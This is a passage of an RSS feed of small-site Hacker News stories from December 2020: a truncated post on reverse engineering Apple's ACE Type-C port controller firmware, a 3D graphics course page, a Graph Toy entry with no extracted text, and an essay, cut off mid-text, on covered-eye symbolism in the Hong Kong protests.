<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>
<![CDATA[Hacker News - Small Sites - Score >= 50]]>
        </title>
        <description>
<![CDATA[Hacker News stories from domains that aren't in the top 1M and that have a score of at least 50. Updated nightly via https://github.com/awendland/hacker-news-small-sites]]>
        </description>
        <link>https://news.ycombinator.com</link>
        <generator>RSS for Node</generator>
        <lastBuildDate>Thu, 31 Dec 2020 17:12:04 GMT</lastBuildDate>
        <atom:link href="https://raw.githubusercontent.com/awendland/hacker-news-small-sites/generated/feeds/hn-small-sites-score-50.xml" rel="self" type="application/rss+xml"></atom:link>
        <pubDate>Thu, 31 Dec 2020 17:12:04 GMT</pubDate>
        <language>
<![CDATA[en-US]]>
        </language>
        <managingEditor>
<![CDATA[me@alexwendland.com (Alex Wendland)]]>
        </managingEditor>
        <ttl>240</ttl>
        <item>
            <title>
<![CDATA[ACE: Apple Type-C Port Controller Secrets]]>
            </title>
            <description>
<![CDATA[
Score 105 | Comments 11 (<a href="https://news.ycombinator.com/item?id=25579286">thread link</a>) | @aunali1
<br/>
December 29, 2020 | https://blog.t8012.dev/ace-part-1/ | <a href="https://web.archive.org/web/*/https://blog.t8012.dev/ace-part-1/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
<div>
<article>

<figure>
<img srcset="https://blog.t8012.dev/content/images/size/w300/2020/12/s-l400.jpg 300w,
                            https://blog.t8012.dev/content/images/size/w600/2020/12/s-l400.jpg 600w,
                            https://blog.t8012.dev/content/images/size/w1000/2020/12/s-l400.jpg 1000w,
                            https://blog.t8012.dev/content/images/size/w2000/2020/12/s-l400.jpg 2000w" sizes="(max-width: 800px) 400px,
                        (max-width: 1170px) 1170px,
                            2000px" src="https://blog.t8012.dev/content/images/size/w2000/2020/12/s-l400.jpg" alt="ACE: Apple Type-C Port Controller Secrets | Part 1">
</figure>
<section>
<div>
<h2 id="introduction">Introduction</h2><p>After our team successfully <a href="https://www.theiphonewiki.com/wiki/T8012#Bootrom_Exploits">ported</a> the <a href="https://www.theiphonewiki.com/wiki/Checkm8_Exploit">checkm8</a> exploit to the AppleSilicon T2 chip, we began exploring methods for closed-case hardware debugging, or CCD, as found on other iDevices. On such devices, the <a href="https://developer.arm.com/architectures/cpu-architecture/debug-visibility-and-trace/coresight-architecture/serial-wire-debug">Serial Wire Debug</a> protocol can be muxed out across the Lightning connector, which we presumed was replicable across the USB Type-C connector. With some assistance from easily obtainable schematics for our MacBook models, we have determined that muxing is handled by an Apple/TI co-designed <a href="https://www.usb.org/document-library/usb-type-cr-port-controller-interface-specification">USB Type-C Port Controller</a>, colloquially known as "ACE". The following details our findings and the vendor defined protocol, termed AppleVDM, Apple has implemented over the USB Power Delivery standard for muxing out various internal peripherals.</p><p>A member of our team, @h0m3us3r has dumped the ACE firmware by attaching a SWD probe onto exposed test points on the logic board of a MacBook Pro. Thanks to this we were able to obtain both the ROM and the firmware payload patch applied over it and discover that the ACE chip contains a <code><a href="https://developer.arm.com/ip-products/processors/cortex-m/cortex-m0">Cortex-M0 r0p1</a></code> ARM core. Most of the static analysis was later conducted by @mrarm.</p><pre><code>Connecting to target via SWD
Found SW-DP with ID 0x0BC11477
DPIDR: 0x0BC11477
Scanning AP map to find all available APs
AP[1]: Stopped AP scan as end of AP map has been reached
AP[0]: AHB-AP (IDR: 0x04770031)
Iterating through AP map to find AHB-AP to use
AP[0]: Core found
AP[0]: AHB-AP ROM base: 0xE00FF000
CPUID register: 0x410CC601. Implementer code: 0x41 (ARM)
Found Cortex-M0 r0p1, Little endian.
FPUnit: 4 code (BP) slots and 0 literal slots
CoreSight components:
ROMTbl[0] @ E00FF000
ROMTbl[0][0]: E000E000, CID: B105E00D, PID: 000BB008 SCS
ROMTbl[0][1]: E0001000, CID: B105E00D, PID: 000BB00A DWT
ROMTbl[0][2]: E0002000, CID: B105E00D, PID: 000BB00B FPB
Cortex-M0 identified.
</code></pre>
<center>Segger J-Link Probe output when attached to ACE2 (CD3217).</center><h2 id="ace-overview">ACE Overview</h2><p>To better understand the inner-workings of ACE, we began looking for identifying information within the dumped firmware. We found the string <code>CD3217 &nbsp; HW0022 FW002.032.00 ZACE2-J213</code> and upon searching <code>CD3217</code> online resulted in the similar <a href="https://www.ti.com/lit/ds/symlink/tps65986.pdf">TI TPS65986</a>. Based on how similar the functional description of the aforementioned TI USB Type-C Controller is to ACE, and considering that TI co-designed ACE with Apple, it was reasonable to assume most of the technical information applies to ACE.</p><p>TI's USB Type-C Controllers expose an I²C interface for host management, for which we found the excellent <a href="https://www.ti.com/lit/ug/slvuan1a/slvuan1a.pdf">Host Interface Technical Reference Manual</a>, documenting a multitude of public I²C registers and commands.</p><figure><img src="https://blog.t8012.dev/content/images/2020/12/image.png" alt="" srcset="https://blog.t8012.dev/content/images/size/w600/2020/12/image.png 600w, https://blog.t8012.dev/content/images/size/w1000/2020/12/image.png 1000w, https://blog.t8012.dev/content/images/2020/12/image.png 1330w" sizes="(min-width: 720px) 720px"><figcaption>TPS65986 Functional Block Diagram</figcaption></figure><p>The primary component of focus based on the above block diagram is the digital core, which communicates directly with the host and runs the firmware we dumped previously. As mentioned, the core is based on a <code>Cortex-M0 r0p1</code>. Unfortunately, we were unable to create a complete memory map with peripherals as TI does not release public information on the core itself. Regardless, we have the basic memory layout as follows:</p><p>Since we weren't sure whether the code for muxing out things lives in the ACE or somewhere else (there are registers for receiving vendor messages and processing them on another chip), we also investigated the firmware of chips that can directly communicate with the ACE, the SMC, part of T2 SoC, and the Thunderbolt controller. While we obtained and analyzed the I2C usages in the SMC firmware and found no suspicious code whatsoever, we had issues with analyzing the Thunderbolt controller firmware and decided to only reverse engineer it as a last resort. We initially thought that the only way that we could talk with the ACE from Mac OS (Intel) was by modifying the SMC firmware to relay commands to the ACE. While we have successfully managed to edit the SMC firmware and talk with the ACE, it turned out that this effort wasn't needed. Later we stumbled upon the following project: <a href="https://github.com/osy/ThunderboltPatcher">https://github.com/osy/ThunderboltPatcher</a>, which uses the AppleHPM kext in order to communicate with the ACE.</p><p>The AppleHPM KEXT allows a user space program running as root to read and write ACE registers. It also has several interesting methods that seem to be intended for reading and writing registers on ACEs connected using a USB Type-C cable to the DUT. Unfortunately, while we tried invoking them, we didn't manage to get these methods working, suggesting that either they have been disabled on production hardware or need some more preparation work in order to work. We also discovered that there exists an EFI mode firmware updater for the ACE called <code>HPMUtil.efi</code>, which we also partially reverse engineered. There seems to be several methods of updating the ACEs depending on the hardware revision; the EFI program also seems to have an argument that makes it update externally connected ACEs, however at least for recent ACEs it seems to be broken; the only update route that would work on the firmware dump we obtained from our Mac (based on available commands) seems to be hardcoded in a few places to run commands on the local ACE.</p><p>There are at least 3 known revisions of the ACE chip. Based on hardware available to us, the first variant, ACE1, is known to be used in 2018 and older T2 models, the second, ACE2, in 2019 and newer T2 models, and the third in 2020 M1 enabled laptops. The software update method differs significantly between ACE1 and ACE2. At the time of writing the article, we have only successfully dumped a single ACE firmware (ACE2) and all the analysis here is based on that version.</p><h2 id="usb-pd">USB PD</h2><p>The logical channel for telling the Mac to mux out something other than USB from the chip would be USB PD, since ACE's main communication vector with external devices is USB PD and because controlling data lines using USB PD is a widespread practice (see: MIPI debug interface as well as this article on getting UART off an Samsung phone: <a href="https://ntnuopen.ntnu.no/ntnu-xmlui/bitstream/handle/11250/2632162/bookchapter.pdf">https://ntnuopen.ntnu.no/ntnu-xmlui/bitstream/handle/11250/2632162/bookchapter.pdf</a>). This TI-derived controller can be configured to support some variant of MIPI debug mode by default (and the MIPI debug ID is present in the Apple ACE firmware as well), however as we discovered later it is disabled in Apple's configuration and can not be used. As such, we decided to look for other Vendor Defined Messages that the ACE understands.</p><p>In the USB PD protocol, entering a vendor mode begins by sending a SVID (Standard ID or Vendor ID, usually the vendor's USB VID) and object position (think of it as a sub mode that the vendor can define). By analyzing the ACE firmware we found at least 3 possible object positions under the Apple SVID, however their availability is dynamic and by default only a single SVID and object position is available. This primary mode is, for example, used when the Apple's charger is connected. We are not sure when the other modes are activated and plan to do further work related to figuring out what the purpose of these other modes is.</p><p>Since it would be logical if there was a reply for the command for entering a mode and also because reverse engineering an embedded firmware with no context whatsoever is hard, we decided to look into the <code>VDMs</code> command, which can be used to send a VDM PD message. This allowed us to gather important information about the firmware's inner workings and also to find a few functions that sent a message with Apple's vendor ID. We investigated several of these, some of them were indeed related to the protocol used with the charger (which we aren't sure what the purpose of is; however from what it seems it can be only used to read some memory sections from the external device), but we also found another procedure that had three cases, two of which replied with 16-bit values (created from information from a particular memory area) in a similar way to the Discover SVIDs VDM, and one of them was complex and handled additional logic. We investigated it further and eventually managed to use it to mux things out of the controller.</p><p>Another possible use of the <code>VDMs</code> command can be found in the AppleHPM KEXT and the <code>HPLUtil.efi</code> program, which is reading registers from externally connected devices. Since we haven't given much attention to it as it was not our goal and our experiments were a failure, we are not going to describe it in this article.</p><p>Note that since SWD can also be muxed from the ACE, further reverse engineering ACE modes is not that interesting; you should be able to use the ACE's SWD to trigger any mux choice of your choosing and directly talk to all peripherals ACE has access to.</p><h2 id="dive-into-the-code">Dive into the code</h2><p>With @h0m3us3r's dump of ROM and RAM memory, we started by loading the ACE firmware in IDA. The reset handler address is present at <code>0x00000004</code> and can be used to get the address of the entrypoint.</p><p>The command table can be trivially found by looking for the 4 character codes. Register table requires a bit more effort but is also not hard to find (since there is a register that is a string, you can find what references it). In comparison to the public TI documentation, there are substantially more commands and registers available, some of which are Apple-specific additions. Since the firmware has barely any strings or debug information, the command list has been very helpful.</p><p>After initially exploring the firmware we quickly stumbled upon cursed looking trampolines such as the following:</p><pre><code>ROM:000266C2 _Command_HRST                           ; DATA XREF: ROM:commandsâ†“o
ROM:000266C2
ROM:000266C2
ROM:000266C2                 PUSH            {R4-R6,LR}
ROM:000266C4                 MOV             R4, R1
ROM:000266C6                 MOV             R5, R0
ROM:000266C8                 BL              sub_E4
ROM:000266CC                 LDR             R0, =dword_20041040
ROM:000266CE                 MOV             R1, R4
ROM:000266D0                 ADDS            R0, #0x40 ; '@'
ROM:000266D2                 LDR             R2, [R0]
ROM:000266D4                 MOV             R0, R5
ROM:000266D6                …</code></pre></div></section></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.t8012.dev/ace-part-1/">https://blog.t8012.dev/ace-part-1/</a></em></p>]]>
            </description>
            <link>https://blog.t8012.dev/ace-part-1/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25579286</guid>
            <pubDate>Wed, 30 Dec 2020 06:49:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Learn 3D Computer Graphics Programming from Scratch]]>
            </title>
            <description>
<![CDATA[
Score 106 | Comments 39 (<a href="https://news.ycombinator.com/item?id=25576462">thread link</a>) | @myth_drannon
<br/>
December 29, 2020 | https://courses.pikuma.com/courses/learn-computer-graphics-programming | <a href="https://web.archive.org/web/*/https://courses.pikuma.com/courses/learn-computer-graphics-programming">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main-content" role="main">
  <a id="cst-v2-section-4ed91abbde"></a>

<section data-preview-item="banner-course" data-section-uid="4ed91abbde">
  
</section>




<a id="cst-v2-section-HycmTyvOE"></a><section data-preview-item="checklist" data-section-uid="HycmTyvOE">
  <div>
    <div>
      
  <header>
    
      <h3>This course includes</h3>
    
    
  </header>


      
        <article>
          <ul>
            
              <li>
                <p><i></i>30 hours of on-demand video</p>
              </li>
            
              <li>
                <p><i></i>Downloadable resources and exercises</p>
              </li>
            
              <li>
                <p><i></i>Full lifetime access</p>
              </li>
            
              <li>
                <p><i></i>Access on mobile and desktop</p>
              </li>
            
              <li>
                <p><i></i>14-day money back guarantee</p>
              </li>
            
              <li>
                <p><i></i>Secure checkout through PayPal or Stripe</p>
              </li>
            
          </ul>
        </article>
        
    </div>
  </div>
</section>




<a id="cst-v2-section-BJzA6XSdN"></a><section data-preview-item="video" data-section-uid="BJzA6XSdN">
  
</section>

  





<a id="cst-v2-section-ryenGXDBH"></a><section data-preview-item="checklist" data-section-uid="ryenGXDBH">
  <div>
    <div>
      
  <header>
    
      <h3>Prerequisites</h3>
    
    
      <h4> Before taking this course, you must have:</h4>
    
  </header>


      
        <article>
          <ul>
            
              <li>
                <p><i></i>A basic understanding of programming fundamentals, such as variables, conditionals, loops, and functions.</p>
              </li>
            
              <li>
                <p><i></i>An idea of what a C-style programming language looks like (for example: C++, Java, C#, JavaScript, or Swift).</p>
              </li>
            
              <li>
                <p><i></i>Some experience with the command-line on either Linux, Windows, or macOS.</p>
              </li>
            
          </ul>
        </article>
        
    </div>
  </div>
</section>




<a id="cst-v2-section-HJ495RX_E"></a><section data-preview-item="text-image" data-section-uid="HJ495RX_E">
  <div>
    <article>
      <section>
        
  <header>
    
      <h3>Is this course for you?</h3>
    
    
  </header>


        <p>
          Did you ever wonder how 3D engines render objects on the screen? Or how graphics APIs such as OpenGL or DirectX are written? This course is a complete immersion on how CPU-based 3D engines work. We will use C to develop a complete 3D engine from scratch, pixel by pixel, triangle per triangle. This is a basic course that requires no prior knowledge, but you will probably make the most of it if you know already the basics of programming.
        </p>
        
          <section>
            <a href="https://courses.pikuma.com/cart/add_product/713851?price_id=758247">Buy $19.99</a>
          </section>
        
      </section>
      
        <section>
          <img src="https://s3.amazonaws.com/thinkific-import/167815/RLXbjGyOQNSYemAckI7t_cube.gif" alt="Is this course for you?" title="Is this course for you?">
        </section>
      
    </article>
  </div>
</section>




<a id="cst-v2-section-BJLXI7uSr"></a><section data-preview-item="text-image" data-section-uid="BJLXI7uSr">
  <div>
    <article>
      <section>
        
  <header>
    
      <h3>What you'll learn</h3>
    
    
      <h4>Course overview and structure</h4>
    
  </header>


        <p>
          This course is a complete journey into the world of 3D rendering. We will learn how to represent and display 3D objects without any graphics API. No OpenGL. No DirectX. No GPU. Just you, your C compiler, a smoking processor, and an array of pixel colors willing to dance 90's style. You will learn how to draw pixels, rasterize lines, triangles, complex 3D models, and understand the theory and the math behind computer graphics programming. If you want to understand how computer graphics really work, join us now!
        </p>
        
          <section>
            <a href="https://courses.pikuma.com/cart/add_product/713851?price_id=758247">Buy $19.99</a>
          </section>
        
      </section>
      
        <section>
          <img src="https://s3.amazonaws.com/thinkific-import/167815/Yyy0bZO3QMKfL54nGwlE_f22.gif" alt="What you'll learn" title="What you'll learn">
        </section>
      
    </article>
  </div>
</section>




<a id="cst-v2-section-SkVHSmBO4"></a><section data-preview-item="text-icon" data-section-uid="SkVHSmBO4">
  <div>
    

    <article>
      
        <div>
          <ul>
            
              <li>
                <i></i>
                <h4>Lifetime access</h4>
                <p>Enroll now and get lifetime access to the course content</p>
              </li>
            
              <li>
                
                <h4>Access to discussion forum</h4>
                <p>Discuss course topics and engage with other students using the discussion board</p>
              </li>
            
              <li>
                <i></i>
                <h4>Money back guarantee</h4>
                <p>We offer a 14-day money back guarantee for all our courses. No questions asked.</p>
              </li>
            
          </ul>
        </div>
      
    </article>
  </div>
</section>




<a id="cst-v2-section-a7929a42cb"></a><section data-preview-item="course-curriculum" data-section-uid="a7929a42cb">
  
</section>






<a id="cst-v2-section-SkoDUs7uE"></a><section data-preview-item="instructor" data-section-uid="SkoDUs7uE">
  <div>
    
  <header>
    
      <h3>Instructor</h3>
    
    
  </header>


    <article>
      
        <ul>
          
          
            <li>
              
              <p><img src="https://thinkific-import.s3.amazonaws.com/167815/UhcXrUppRcGK1ZTSy8gj_profile-picture-bass2-small-square.png" alt="Gustavo Pezzi" title="Gustavo Pezzi">
              </p>
              
              <div>
                <header>
                  
                    <h4>
                      Senior Lecturer
                    </h4>
                  
                  <h4>
                    Gustavo Pezzi
                  </h4>
                </header>
                
                  <section>
                    Gustavo teaches computer science and mathematics at BPP University, London. He studies how teaching game programming can help enhance awareness and understanding of basic mathematics and physics. He is also a professional software engineer with more than 10 years of experience, with an industry background in 3D systems, games, systems, databases, and data analysis.
His academic path includes institutions such as Pittsburg State University, City University of London, and University of Oxford.
                  </section>
                  
                
              </div>
            </li>
          
        </ul>
      
    </article>
  </div>
</section>






<a id="cst-v2-section-zg3768Lds"></a><section data-preview-item="reviews" data-section-uid="zg3768Lds">
  <div>
    
  <header>
    
      <h3>Reviews</h3>
    
    
  </header>


    <article>
      
        <ul>
          
            
            <li data-review-id="1">
              <header>
                <span>
                  
                    
                    <i></i>

                  
                    
                    <i></i>

                  
                    
                    <i></i>

                  
                    
                    <i></i>

                  
                    
                    <i></i>

                  
                </span>
                <h4>
                  Great course
                </h4>
                
              </header>
              <section>
                <div>
                  <p>Been waiting for a course like this for years.  A lot of the theory of 3d graphics is availablein books and online , but none that put it into practice in su...</p>
                  
                    <p><a>
                      Read More
                    </a>
                  
                </p></div>
                <div>
                  <p>Been waiting for a course like this for years.  A lot of the theory of 3d graphics is availablein books and online , but none that put it into practice in such a clear way (if at all) . Also using C which I am more comfortable using than OOP (i'm a bit old school) .  It is a great refresher on C too, its a big project so far (only a bout 1/3 of the way through), but loving it so far.  </p>
                  <p><a>
                    Read Less
                  </a>
                </p></div>
              </section>
            </li>
          
            
            <li data-review-id="2">
              <header>
                <span>
                  
                    
                    <i></i>

                  
                    
                    <i></i>

                  
                    
                    <i></i>

                  
                    
                    <i></i>

                  
                    
                    <i></i>

                  
                </span>
                <h4>
                  Very good course and very well explained
                </h4>
                <h4>jÃ©rÃ©my aldebert</h4>
              </header>
              <section>
                <p>The course is very understandable. Everything is explained in detail with clarity. I am very happy.</p>
                <div>
                  <p>The course is very understandable. Everything is explained in detail with clarity. I am very happy.</p>
                  <p><a>
                    Read Less
                  </a>
                </p></div>
              </section>
            </li>
          
            
            <li data-review-id="3">
              <header>
                <span>
                  
                    
                    <i></i>

                  
                    
                    <i></i>

                  
                    
                    <i></i>

                  
                    
                    <i></i>

                  
                    
                    <i></i>

                  
                </span>
                <h4>
                  The real 3d graphics fundamentals course
                </h4>
                <h4>Andrew Douglas</h4>
              </header>
              <section>
                <div>
                  <p>This course going into details which are usually if not always omitted by other courses in this category. I liked that the math and actual algorithms were di...</p>
                  
                    <p><a>
                      Read More
                    </a>
                  
                </p></div>
                <div>
                  <p>This course going into details which are usually if not always omitted by other courses in this category. I liked that the math and actual algorithms were discussed before implementing them and student own problem solving opportunity was encouraged throughout. This course has enabled me to fill in the critical gaps in some of the most important fundamental concepts in 3d graphics programming. Hope to see more!! Thank you.</p>
                  <p><a>
                    Read Less
                  </a>
                </p></div>
              </section>
            </li>
          
            
            <li data-review-id="4">
              <header>
                <span>
                  
                    
                    <i></i>

                  
                    
                    <i></i>

                  
                    
                    <i></i>

                  
                    
                    <i></i>

                  
                    
                    <i></i>

                  
                </span>
                <h4>
                  I wish I had this course at the beginning of my career !
                </h4>
                <h4>N PA</h4>
              </header>
              <section>
                <div>
                  <p>As a self taught programmer (that is now working in the game industry) I wish I had this course at the beginning of my career. I bought it because I want to ...</p>
                  
                    <p><a>
                      Read More
                    </a>
                  
                </p></div>
                <div>
                  <p>As a self taught programmer (that is now working in the game industry) I wish I had this course at the beginning of my career. I bought it because I want to support those kind of materials! I basically learned all this stuff by myself through books and articles, but this course is a all in one place to learn them all at once, in a fun/approachable and motivating way that will make you save some precious time. Even if this is a good refresher for me and I already had the "clicks" before, I'll recommend it for anyone wanting to become a graphics/game/programmer !</p>
                  <p><a>
                    Read Less
                  </a>
                </p></div>
              </section>
            </li>
          
            
            <li data-review-id="5">
              <header>
                <span>
                  
                    
                    <i></i>

                  
                    
                    <i></i>

                  
                    
                    <i></i>

                  
                    
                    <i></i>

                  
                    
                    <i></i>

                  
                </span>
                <h4>
                  Great Course
                </h4>
                <h4>Peter Lous</h4>
              </header>
              <section>
                <div>
                  <p>If you want to …</p></div></section></li></ul></article></div></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://courses.pikuma.com/courses/learn-computer-graphics-programming">https://courses.pikuma.com/courses/learn-computer-graphics-programming</a></em></p>]]>
            </description>
            <link>https://courses.pikuma.com/courses/learn-computer-graphics-programming</link>
            <guid isPermaLink="false">hacker-news-small-sites-25576462</guid>
            <pubDate>Tue, 29 Dec 2020 23:40:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Graph Toy, an interactive graph visualizer using mathematical functions]]>
            </title>
            <description>
<![CDATA[
Score 160 | Comments 24 (<a href="https://news.ycombinator.com/item?id=25574661">thread link</a>) | @netule
<br/>
December 29, 2020 | http://memorystomp.com/graphtoy/ | <a href="https://web.archive.org/web/*/http://memorystomp.com/graphtoy/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>http://memorystomp.com/graphtoy/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25574661</guid>
            <pubDate>Tue, 29 Dec 2020 20:40:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Owl’s Right Eye (2019)]]>
            </title>
            <description>
<![CDATA[
Score 117 | Comments 22 (<a href="https://news.ycombinator.com/item?id=25574623">thread link</a>) | @paulorlando
<br/>
December 29, 2020 | https://unintendedconsequenc.es/the-owls-right-eye/ | <a href="https://web.archive.org/web/*/https://unintendedconsequenc.es/the-owls-right-eye/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-1487">
		<!-- .entry-header -->

	
	<div>
		<p>Let’s come back, more directly, to a theme in my writing — what happens when something small becomes a tipping point for change. <strong>When the seemingly innocuous becomes unpredictable.</strong></p>
<p>If you’ve only casually followed the <a href="https://unintendedconsequenc.es/why-are-there-so-many-protests-in-hong-kong/">Hong Kong protests</a> and reaction from the Chinese mainland and overseas Chinese communities, you might wonder about the importance and meaning of the covered eye. Specifically, the right eye.</p>
<p>Hong Kong protesters found one of their many symbols (and there are many) when police shot and injured the right eye of a protesting woman in August. The injured eye is a more powerful symbol than even that of the man police shot on October 1 (Chinese National Day) in the chest (that is, <em>the heart</em>).</p>
<p>But since the now famous protester’s eye injury we’ve seen company ad campaign apologies and even an individual arrest all because of missing eyes.</p>
<p>But the eye I was reminded of was none of these. It was a different eye — also a right eye and in China — that over 40 years ago had results reminiscent to those eyes of today.</p>

<p>If you are a student of Chinese Cultural Revolution artwork, you might recognize this painting of an owl by Huang Yongyu.</p>
<p><img loading="lazy" src="https://unintendedconsequenc.es/wp-content/uploads/2019/10/Huang-Yongyu-Owl.jpg" alt="Huang Yongyu's owl with one closed eye" width="400" height="607" srcset="https://unintendedconsequenc.es/wp-content/uploads/2019/10/Huang-Yongyu-Owl.jpg 300w, https://unintendedconsequenc.es/wp-content/uploads/2019/10/Huang-Yongyu-Owl-198x300.jpg 198w" sizes="(max-width: 400px) 100vw, 400px"></p>
<p>Huang served three and a half years in a labor camp for it.</p>
<p>The <a href="https://www.wikiart.org/en/huang-yongyu/owl-1973">painting was interpreted</a> as a “portrayal of public officials turning a blind eye to wrong doings.” It’s not clear if he meant it as such.</p>
<p>Huang’s owl was one of many works of art gathered for a “black painting” (meaning counter-revolutionary) <a href="https://publishing.cdlib.org/ucpressebooks/view?docId=ft6w1007nt&amp;chunk.id=d0e11683&amp;toc.id=d0e10324&amp;toc.depth=100&amp;brand=ucpress&amp;anchor.id=bkd0e11803#X">exhibition and criticism</a> meeting in the 1970s. In some cases, officials had to scrounge around to find more “black painters” to have enough art to criticize. If you read some of the art descriptions, it seems like at least some of the artists were just unlucky rather than counter-revolutionary.</p>
<p>And while I haven’t seen anyone publicly connect Huang’s winking owl with the protests of today, I imagine people with longer memories think about it.</p>
<p>Next in chronology we have of course the event from this summer in Hong Kong. A woman attending a protest was shot in her right eye. Covering one’s <a href="https://www.thelily.com/an-eye-for-an-eye-how-one-womans-eye-patch-became-the-symbol-of-the-hong-kong-protests/">right eye</a> soon became a symbol.</p>
<figure id="attachment_1496" aria-describedby="caption-attachment-1496"><img loading="lazy" src="https://unintendedconsequenc.es/wp-content/uploads/2019/10/Hong-Kong-eye-e1572126020800.png" alt="Covering the right eye" width="600" height="309"><figcaption id="caption-attachment-1496">from <a href="https://www.washingtonpost.com/world/2019/08/13/how-bloody-eye-patches-became-latest-symbol-escalating-hong-kong-protests/">Washington Post</a> article</figcaption></figure>
<p>And as a good symbol, it is impossible to ignore (you can’t look away from someone’s eyes and still talk). As a good symbol it also brings the eye-patch wearers themselves into some discomfort.</p>
<p>The eye symbol became even better known when a foreign company felt pressure to remove and apologize for an old ad that predated the Hong Kong protests, but which happened to include a covered right eye.</p>
<p>Here’s a <a href="https://www.pinterest.com/pin/742601426037240952/">Tiffany ad</a> (since removed) that pre-dates the protests.</p>
<p><img loading="lazy" src="https://unintendedconsequenc.es/wp-content/uploads/2019/10/Tiffany-eye-1.jpg" alt="Tiffany ad - one covered eye" width="474" height="554" srcset="https://unintendedconsequenc.es/wp-content/uploads/2019/10/Tiffany-eye-1.jpg 474w, https://unintendedconsequenc.es/wp-content/uploads/2019/10/Tiffany-eye-1-257x300.jpg 257w" sizes="(max-width: 474px) 100vw, 474px"></p>
<p>And here’s <a href="https://www.hongkongfp.com/2019/10/08/tiffany-removes-advert-hong-kong-controversy/">another Tiffany ad</a>, also removed following complaints to the company for stirring up social disorder.</p>
<p><img loading="lazy" src="https://unintendedconsequenc.es/wp-content/uploads/2019/10/Tiffany-eye-2-1024x532.jpg" alt="Tiffany ad - covered right eye" width="525" height="273" srcset="https://unintendedconsequenc.es/wp-content/uploads/2019/10/Tiffany-eye-2-1024x532.jpg 1024w, https://unintendedconsequenc.es/wp-content/uploads/2019/10/Tiffany-eye-2-300x156.jpg 300w, https://unintendedconsequenc.es/wp-content/uploads/2019/10/Tiffany-eye-2-768x399.jpg 768w, https://unintendedconsequenc.es/wp-content/uploads/2019/10/Tiffany-eye-2.jpg 1050w" sizes="(max-width: 525px) 100vw, 525px"></p>
<p>And to compare, here’s another picture of Sun Feifei (the same model in the second Tiffany ad) covering her right eye in another photo shoot, also months before the protests in Hong Kong. And actually shown on a <a href="http://www.china.org.cn/photos/2010-04/20/content_19863707.htm">government-run website, even today</a>.</p>
<p><img loading="lazy" src="https://unintendedconsequenc.es/wp-content/uploads/2019/10/Sun-Feifei-eye.jpg" alt="Tiffany model covering her right eye" width="400" height="600" srcset="https://unintendedconsequenc.es/wp-content/uploads/2019/10/Sun-Feifei-eye.jpg 400w, https://unintendedconsequenc.es/wp-content/uploads/2019/10/Sun-Feifei-eye-200x300.jpg 200w" sizes="(max-width: 400px) 100vw, 400px"></p>
<p>So eye covering can look like a matter of intent. The china.org.cn right eye picture can obviously have no connection to the Hong Kong protests. But a foreign company is different, even with ads shot months before the covered eye became a protest symbol.</p>
<p>Of course, the covered eye — again, the right eye — has been used famously before in an ad campaign: “The Man in the Hathaway Shirt.”</p>
<p><img loading="lazy" src="https://unintendedconsequenc.es/wp-content/uploads/2019/10/hathaway-shirt-595x800.jpg" alt="Man in the Hathaway shirt" width="525" height="706" srcset="https://unintendedconsequenc.es/wp-content/uploads/2019/10/hathaway-shirt-595x800.jpg 595w, https://unintendedconsequenc.es/wp-content/uploads/2019/10/hathaway-shirt-223x300.jpg 223w, https://unintendedconsequenc.es/wp-content/uploads/2019/10/hathaway-shirt.jpg 645w" sizes="(max-width: 525px) 100vw, 525px"></p>
<p>No political meaning. Just an Ogilvy ad with the eyepatch used as a gimmick.</p>
<p>But there’s more again.</p>
<p>A <a href="https://shanghaiist.com/2019/10/08/houston-rockets-fan-detained-for-posting-photo-of-himself-about-to-burn-chinese-flag/">Houston Rockets fan in China</a> (the same team whose manager posted a “Stand with Hong Kong” tweet) was much too cynical on the ability of his government to track him down.</p>
<p>The first line (after the hashtag) says: “I live and die with my team.” The second line: “Come and catch me.”</p>
<p><img loading="lazy" src="https://unintendedconsequenc.es/wp-content/uploads/2019/10/rockets-fan-arrest-1024x546.jpg" alt="Covered right eye, now in jail" width="525" height="280" srcset="https://unintendedconsequenc.es/wp-content/uploads/2019/10/rockets-fan-arrest.jpg 1024w, https://unintendedconsequenc.es/wp-content/uploads/2019/10/rockets-fan-arrest-300x160.jpg 300w, https://unintendedconsequenc.es/wp-content/uploads/2019/10/rockets-fan-arrest-768x410.jpg 768w" sizes="(max-width: 525px) 100vw, 525px"></p>
<p>They caught him, just a few hours later. And it appears he covered an eye to make facial identification more difficult. But again, what if he hadn’t covered his eye?</p>
<p>The apology from Tiffany strikes an international audience as the exportation of anti-protester values. The above picture of the NBA fan chained in a “tiger chair” strikes an international audience as not the future they want for themselves. <strong>Has the visual symbol of the eye — uncontrollable once the injury and advertisements happened — helped spread this message further?</strong></p>
<h2>Wearing of Masks</h2>
<p>Should protesters anywhere be allowed to wear masks? While a number of US states already had <a href="https://www.bostonglobe.com/metro/2019/10/22/boston-and-hong-kong-debate-over-masks/JYajFCkul7UMw7PaXyZ5vL/story.html">mask bans in public spaces</a>, general public opinion seemed even more in support of the bans after a number of mask wearing Antifa members beat up a reporter in Portland earlier this year. The argument against masks was that covering one’s face minimize the feeling of social disapproval and led to worse behavior.</p>
<p>The US has at times overturned mask bans, famously after the Iranian Revolution as a way to protect Iranian protesters in California. But those masked were protesting a government from which they had fled to the US. It’s a different story when the protesters are domestic.</p>
<p>But a different explanation emerged in the Hong Kong protests now that we have <a href="https://unintendedconsequenc.es/emergence-of-omniscience-part-1-images/">identity at scale</a>. Protesters had already taken cautions to avoid identification by using single-use MTR (metro) transit cards and paying in cash. But faces could be identified at scale either live or in the near future by capturing records of protest attendance, assessing behavior, and following up with repercussions.</p>
